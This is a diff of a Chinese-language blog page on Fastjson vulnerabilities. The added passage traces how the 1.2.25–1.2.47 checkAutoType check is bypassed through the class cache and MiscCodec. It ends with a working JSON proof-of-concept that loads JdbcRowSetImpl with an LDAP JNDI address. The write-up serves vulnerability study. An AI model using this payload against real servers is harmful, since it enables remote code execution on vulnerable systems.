@@ -120,7 +120,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/Java/" style="color: #00a596">
+                <a href="/tags/Java/" style="color: #00bcd4">
                     Java
                 </a>
             </span>
@@ -379,7 +379,7 @@ public class Main &#123;
 <p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440925846.png" alt="image-1720440925846"></p>
 <p>接下来想办法调用loadclass</p>
 <p>导入tomcat依赖</p>
-<pre><code class="pom">        &lt;dependency&gt;
+<pre><code>        &lt;dependency&gt;
             &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
             &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;
             &lt;version&gt;9.0.20&lt;/version&gt;
@@ -419,7 +419,65 @@ public class Main &#123;
         JSON.parseObject(s);
 </code></pre>
 <p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441061384.png" alt="image-1720441061384"></p>
-<h2 id="fastjson1-2-25"><a href="#fastjson1-2-25" class="headerlink" title="fastjson1.2.25&lt;&#x3D;1.2.47绕过"></a>fastjson1.2.25&lt;&#x3D;1.2.47绕过</h2>
+<h2 id="fastjson1-2-25"><a href="#fastjson1-2-25" class="headerlink" title="fastjson1.2.25&lt;&#x3D;1.2.47绕过"></a>fastjson1.2.25&lt;&#x3D;1.2.47绕过</h2><p>pom改为1.2.25</p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+            &lt;version&gt;1.2.25&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>运行JdbcRowSetImpl反序列化链的POC报错了</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441123017.png" alt="image-1720441123017"></p>
+<p>在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,<br>java.lang.Object)方法里面，loadClass变成了checkAutoType</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441128769.png" alt="image-1720441128769"></p>
+<p>1.2.24版本为</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441135735.png" alt="image-1720441135735"></p>
+<p>跟进去checkAutoType，里面有很多的if判断，往下跟发现一个*TypeUtils.*getClassFromMapping**</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441142677.png" alt="image-1720441142677"></p>
+<p>跟进去<em>getClassFromMapping</em>，在mappings获取了一个缓存</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441150553.png" alt="image-1720441150553"></p>
+<p>回到checkAutoType，接下来如果缓存为null，又在反序列化器去寻找。</p>
+<pre><code>        if (clazz == null) &#123;
+            clazz = deserializers.findClass(typeName);
+        &#125;
+</code></pre>
+<p>发现默认缓存是null，但是如果缓存是一个类，直接会返回，就能加载这个类。</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441176992.png" alt="image-1720441176992"></p>
+<p>查找mappings赋值的地方，发现loadClass有赋值的情况。</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441185615.png" alt="image-1720441185615"></p>
+<p>再看一下哪里调用了loadClass，在MiscCodec#deserialze满足(clazz &#x3D;&#x3D;<br>Class.class)会调用loadClass</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441192737.png" alt="image-1720441192737"></p>
+<p>MiscCodec类实现了两个接口，序列化器和反序列化器</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441199147.png" alt="image-1720441199147"></p>
+<p>反序列化器是在DefaultJSONParser生成的</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441204714.png" alt="image-1720441204714"></p>
+<p>跟进config.getDeserializer往上翻发现put了很多的类，初始化的时候会把这些类和对应的反序列化器都放进去</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441211612.png" alt="image-1720441211612"></p>
+<p>如果反序列化的类是Class.class就会调用MiscCodec反序列化器</p>
+<pre><code>deserializers.put(Class.class, MiscCodec.instance);
+</code></pre>
+<p>然后会调用到MiscCodec#deserialze里面的TypeUtils.<em>loadClass</em></p>
+<pre><code>        if (clazz == Class.class) &#123;
+            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
+        &#125;
+</code></pre>
+<p>TypeUtils#loadClass()会把这个类加载，并且放到缓存里面</p>
+<pre><code>        try &#123;
+            clazz = Class.forName(className);
+            mappings.put(className, clazz);
+
+            return clazz;
+</code></pre>
+<p>然后在ParserConfig#checkAutoType查找到了缓存，那么进入if里面返回了clazz，绕过了这个检查。</p>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441229398.png" alt="image-1720441229398"></p>
+<p>构造poc</p>
+<pre><code>    public static void main(String[] args) &#123;
+        String s = &quot;&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/#T\", \"autoCommit\":false&#125;&#125;&quot;;
+        JSON.parseObject(s);
+    &#125;
+</code></pre>
+<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441236540.png" alt="image-1720441236540"></p>
+
     </div>
     
     
